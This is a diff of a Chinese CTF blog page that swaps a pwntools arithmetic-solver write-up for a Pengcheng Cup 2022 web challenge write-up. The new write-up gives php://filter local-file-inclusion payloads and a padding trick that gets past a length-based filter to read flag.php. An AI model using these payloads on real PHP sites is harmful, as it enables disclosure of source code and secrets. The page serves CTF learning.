@@ -6,17 +6,19 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>GDOUCTF2023-小学数学-wp | Antel0p3&#39;s blog</title>
+  <title>鹏城杯2022-简单包含-wp | Antel0p3&#39;s blog</title>
   <meta name="author" content="John Doe">
   
-  <meta name="description" content="相关资源
-exp查看server.py代码逻辑, 简单替换运算
-123456789101112131415161718192021222324252627from pwn import *context.log_level = &amp;#x27;debug&amp;#x27;proc = remote(&amp;quot">
+  <meta name="description" content="题目链接   
+页面源码1234&amp;lt;?php highlight_file(__FILE__);include($_POST[&amp;quot;flag&amp;quot;]);//flag in /var/www/html/flag.php;
+
+exp伪协议查看flag发现被过滤
+1?flag=php://">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="GDOUCTF2023-小学数学-wp"/>
+  <meta property="og:title" content="鹏城杯2022-简单包含-wp"/>
   <meta property="og:site_name" content="Antel0p3&#39;s blog"/>
 
   
@@ -113,13 +115,13 @@ exp查看server.py代码逻辑, 简单替换运算
 								<h1>
 									
 											
-												GDOUCTF2023-小学数学-wp
+												鹏城杯2022-简单包含-wp
 									
 									
 								</h1>
 								
-									<p id="/2023/06/13/GDOUCTF2023-easymath-wp/" class="leancloud-visitors view"
-										data-flag-title="GDOUCTF2023-小学数学-wp">
+									<p id="/2023/07/11/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB-wp/" class="leancloud-visitors view"
+										data-flag-title="鹏城杯2022-简单包含-wp">
 										<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 									</p>
 									
@@ -140,9 +142,18 @@ exp查看server.py代码逻辑, 简单替换运算
 	<div class="mypage">		
 	  		
 
-	  <p><a target="_blank" rel="noopener" href="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2023/06/13/GDOUCTF2023-easymath-wp">相关资源</a></p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>查看server.py代码逻辑, 简单替换运算</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">proc = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>, <span class="number">28793</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.send(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"></span><br><span class="line">d = &#123;<span class="string">&#x27;//&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%&#x27;</span>: <span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;%&#x27;</span>&#125;</span><br><span class="line">sla(<span class="string">b&#x27;start...&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">301</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;Round&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    epr = ru(<span class="string">b&#x27;= &#x27;</span>)[:-<span class="number">3</span>].decode().split(<span class="string">&#x27; &#x27;</span>) <span class="comment">#空格分隔</span></span><br><span class="line">    epr[<span class="number">1</span>] = d[epr[<span class="number">1</span>]] <span class="comment"># 替换运算符</span></span><br><span class="line">    epr = <span class="string">&#x27;&#x27;</span>.join(epr)</span><br><span class="line">    <span class="built_in">print</span>(epr)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="built_in">eval</span>(epr)).encode())</span><br></pre></td></tr></table></figure>
+	  <p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2422">题目链接</a>   </p>
+<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line"><span class="comment">//flag in /var/www/html/flag.php;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="伪协议查看flag"><a href="#伪协议查看flag" class="headerlink" title="伪协议查看flag"></a>伪协议查看flag</h3><p>发现被过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看index源码"><a href="#查看index源码" class="headerlink" title="查看index源码"></a>查看index源码</h3><p>当输入长度小于800时 过滤flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ?flag=php://filter/convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>)) &lt; <span class="number">800</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/&#x27;</span>, <span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="最后发送字符数-gt-800-然后查看flag"><a href="#最后发送字符数-gt-800-然后查看flag" class="headerlink" title="最后发送字符数&gt;800 然后查看flag"></a>最后发送字符数&gt;800 然后查看flag</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+
 	  <div class="article-footer-copyright">
 
     本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
@@ -151,7 +162,7 @@ exp查看server.py代码逻辑, 简单替换运算
 	</div>
 
 	<!-- 
-		<span id="/2023/06/13/GDOUCTF2023-easymath-wp/" class="leancloud-visitors view" data-flag-title="GDOUCTF2023-小学数学-wp">
+		<span id="/2023/07/11/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-%E7%AE%80%E5%8D%95%E5%8C%85%E5%90%AB-wp/" class="leancloud-visitors view" data-flag-title="鹏城杯2022-简单包含-wp">
 			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
 		</span>
 	 -->
@@ -163,13 +174,12 @@ exp查看server.py代码逻辑, 简单替换运算
 
     
     
-    <a href="/2023/06/13/NISACTF2022-shoppwn-wp/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2023/06/12/BJDCTF2020-girlfriend-wp/" type="button" class="btn btn-default ">Next<i
+    <a href="/2023/07/11/SWPUCTF2022-ezezphp-wp/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -228,7 +238,7 @@ new Valine(valineConfig);
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2023-06-13 
+	2023-07-11 
 	</div>
 	
 
@@ -239,7 +249,7 @@ new Valine(valineConfig);
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/pwn-wp/">pwn-wp<span>6</span></a></li>
+    <li><a href="/categories/web-wp/">web-wp<span>12</span></a></li>
   </li>
 
     </ul>
@@ -252,7 +262,7 @@ new Valine(valineConfig);
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/CTF/">CTF<span>26</span></a></li> <li><a href="/tags/pwn/">pwn<span>7</span></a></li> <li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>20</span></a></li>
+  <li><a href="/tags/CTF/">CTF<span>26</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>20</span></a></li> <li><a href="/tags/web/">web<span>13</span></a></li> <li><a href="/tags/php/">php<span>10</span></a></li> <li><a href="/tags/include/">include<span>1</span></a></li> <li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
     </ul>
 	</div>
 		
